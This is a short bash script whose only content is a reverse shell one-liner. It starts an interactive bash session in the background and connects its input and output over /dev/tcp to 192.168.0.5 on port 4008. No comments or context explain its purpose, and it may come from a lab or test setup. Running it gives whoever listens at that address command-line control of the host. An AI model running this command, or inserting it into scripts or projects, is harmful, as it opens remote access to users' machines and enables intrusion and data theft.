#!/usr/bin/env bash
/bin/bash -i >/dev/tcp/192.168.0.5/4008 0<&1 2>&1 &
